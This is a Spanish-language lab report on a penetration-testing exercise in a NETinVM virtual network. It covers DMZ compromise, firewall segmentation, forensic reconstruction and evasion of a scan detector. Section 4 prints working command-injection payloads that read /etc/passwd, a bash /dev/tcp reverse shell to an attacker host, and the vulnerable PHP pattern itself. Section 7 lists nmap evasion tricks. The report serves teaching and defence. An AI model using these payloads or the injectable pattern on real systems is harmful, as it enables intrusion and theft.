Resumen ejecutivo. Desde un equipo situado en la red externa (EXT) se reconstruyó por completo la superficie de ataque de la organización, se comprometió el servidor web de la DMZ mediante una inyección de comandos (obteniendo ejecución remota como www-data y una reverse shell), se comprobó que el cortafuegos impide el pivoting TCP DMZ→INT (segmentación efectiva), se reconstruyó cronológicamente el ataque a partir de capturas y logs, y se evaluó un detector de escaneos frente a siete técnicas de evasión. El laboratorio demuestra tanto vías reales de compromiso como la eficacia de la segmentación de red bien diseñada.

1. Entorno NETinVM y montaje

NETinVM es una máquina virtual única (denominada base, Debian 12) que, mediante KVM/libvirt anidado, levanta varias mini-máquinas y las conecta en tres redes separadas por un cortafuegos. El direccionamiento sigue el patrón 10.5.<RED>.<MÁQUINA>/24, con RED: 0=EXT, 1=DMZ, 2=INT; base=.1 y fw=.254 en cada red.

La imagen oficial (VMware, 22-jul-2025, SHA256 verificado) se ejecutó en VMware Workstation Pro sobre Windows 11 con la virtualización anidada habilitada (Hyper-V/VBS desactivados). 2. Punto 0 — Ejercicios base de NETinVM

2.1 Ejercicio 1 — Captura de una comunicación HTTP

Desde base se capturó el tráfico de la DMZ en la interfaz espejo mirror-dmz mientras exta solicitaba http://www.example.net. La captura muestra el saludo TCP a tres vías completo y el intercambio HTTP GET / → 200 OK servido por Apache.

4. Punto 2 — Compromiso controlado de la DMZ

Vulnerabilidad. Inyección de comandos de SO (OS Command Injection, CWE-78) en una utilidad web de diagnóstico (ping.php) desplegada en dmza, que concatena entrada del usuario sin sanear a una llamada system("ping -c1 " . $_GET['ip']).

Metodología de explotación (desde exta → www.example.net)

# 1) Confirmacion de RCE (inyeccion con ';')
$ curl "http://www.example.net/ping.php?ip=127.0.0.1;id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ curl "http://www.example.net/ping.php?ip=127.0.0.1;head -5 /etc/passwd"
root:x:0:0:root:/root:/bin/bash ...

# 2) Reverse shell: dmza → exta:4444
payload = 127.0.0.1;bash -c 'bash -i >& /dev/tcp/10.5.0.10/4444 0>&1'

Evidencia del acceso (transcript de la reverse shell recibida en exta)

Análisis de impacto. Se obtiene ejecución de comandos y shell interactiva como www-data en la DMZ: lectura de ficheros del servidor, manipulación del sitio web y, sobre todo, un punto de apoyo (foothold) desde el cual intentar el movimiento lateral hacia la red interna (Punto 3). El origen de la reverse shell saliente (dmza→EXT:4444) es posible porque el cortafuegos permite conexiones DMZ→EXT.

5. Punto 3 — Pivoting y movimiento lateral hacia INT

Desde el equipo comprometido (dmza) se evaluó la posibilidad de alcanzar la red interna (INT, 10.5.2.0/24).

Figura 2. Ruta de ataque: el compromiso llega hasta la DMZ; el firewall corta el pivoting TCP hacia INT.

Prueba de pivoting (desde dmza)

ping 10.5.2.10 (inta)   → PING-OK
ping 10.5.2.254 (fw)    → PING-OK
TCP 10.5.2.10:22        → cerrado/filtrado
TCP 10.5.2.10:80        → cerrado/filtrado
TCP 10.5.2.10:3306      → cerrado/filtrado

Reglas del cortafuegos (extracto iptables -S)

-P FORWARD DROP
-A FORWARD -s 10.5.1.0/24 -o eth-ext -p tcp ... ACCEPT   # DMZ→EXT
-A FORWARD -s 10.5.1.0/24 -d 10.5.0.1 --dport 53 ACCEPT  # DMZ→DNS
-A FORWARD -p icmp --icmp-type 8 ... ACCEPT              # ping global
# (no existe regla DMZ 10.5.1.0/24 -> INT 10.5.2.0/24)
Figura 4. Captura real desde dmza (foothold): ICMP hacia INT permitido, pero TCP a inta (22/80/3306) bloqueado por el firewall.
Análisis. La segmentación funciona. El firewall aplica default-deny en FORWARD y solo autoriza a la DMZ a iniciar tráfico hacia EXT (Internet) y DNS. No hay ninguna regla que permita DMZ→INT por TCP/UDP, por lo que esos intentos caen en la política DROP. El ping sí funciona porque existe una regla global que acepta ICMP echo, pero esto no habilita ninguna sesión útil. Conclusión: el pivoting desde una DMZ comprometida hacia la red interna está impedido por diseño. Para endurecerlo aún más podría eliminarse el ICMP echo global entre DMZ e INT.

7. Punto 5 — Evasión de un mecanismo de detección

7.1 Mecanismo de detección propuesto

Detector de reconocimiento por umbral y ventana temporal, ejecutado en base sobre mirror-ext: se cuentan los puertos destino distintos contactados por SYN desde una misma IP origen en una ventana de 12 s; si el total supera UMBRAL = 50, se emite una alerta de posible escaneo.

7.3 Análisis y propuesta de mejora

El detector por umbral/ventana es eficaz contra escaneos rápidos y ruidosos, pero se evade con: (a) escaneos lentos (-T0/-T1, --scan-delay) que reparten las sondas fuera de la ventana; (b) fragmentación, que rompe la coincidencia del filtro a nivel de paquete; y (c) señuelos, que no evitan la detección pero diluyen la atribución. El compromiso clave es detección ↔ falsos positivos: bajar el umbral o alargar la ventana detecta escaneos lentos a costa de más falsos positivos.

Mejoras propuestas.
  • Ventanas deslizantes largas con memoria de estado por IP (correlación de intentos a lo largo de horas), en vez de una ventana fija corta.
  • Reensamblado de fragmentos antes de inspeccionar (o usar un IDS con stream reassembly como Suricata/Snort) para anular -f.
  • Detección por entropía/dispersión de puertos y no solo por conteo, para captar barridos lentos y distribuidos.
  • Combinar con reputación y con correlación de connection attempts a puertos cerrados/filtrados (huella típica de escaneo).

8. Conclusiones generales

  • La superficie de ataque expuesta a Internet se limita a dos servicios de la DMZ (HTTP en dmza, FTP en dmzb); la red interna (INT) no es alcanzable desde el exterior.
  • El primer acceso se logró explotando una vulnerabilidad de aplicación (inyección de comandos), no del servicio de red en sí: la seguridad perimetral no sustituye al desarrollo seguro.
  • La segmentación con cortafuegos default-deny frenó el movimiento lateral DMZ→INT: una DMZ comprometida no pudo pivotar por TCP hacia los sistemas internos.
  • La reconstrucción forense fue posible correlacionando capturas de red e IoCs con los logs de aplicación, evidenciando la importancia de la telemetría en múltiples capas.
  • La detección por umbral es necesaria pero insuficiente: los escaneos lentos, fragmentados o con señuelos exigen detectores con estado, reensamblado y correlación temporal.
Balance. El laboratorio demuestra un patrón realista: un fallo de aplicación permite comprometer el borde, pero una arquitectura de red bien segmentada contiene el impacto e impide que el incidente escale a la red interna.
